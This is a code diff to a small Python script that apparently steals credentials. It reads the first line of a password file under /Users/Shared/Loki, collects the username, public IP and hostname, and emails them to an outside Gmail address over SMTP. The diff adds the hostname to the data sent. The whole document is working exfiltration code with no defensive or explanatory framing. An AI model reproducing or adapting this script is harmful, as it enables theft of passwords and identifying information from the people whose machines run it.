@@ -6,6 +6,7 @@ from json import load
 from urllib2 import urlopen
 
 ip = load (urlopen ('http://jsonip.com'))['ip']
+un = socket.gethostname () + ".modem"
 
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEText import MIMEText
@@ -16,7 +17,7 @@ msg['To'] = 'th3ta403@gmail.com'
 msg['Subject'] = socket.gethostname ()
 with open('/Users/Shared/Loki/Password.txt') as f:
     first_line = f.readline ()
-message = getpass.getuser() + "\n" + first_line + "\n" + ip
+message = getpass.getuser() + "\n" + first_line + "\n" + ip + "\n" + un
 msg.attach(MIMEText(message))
 
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
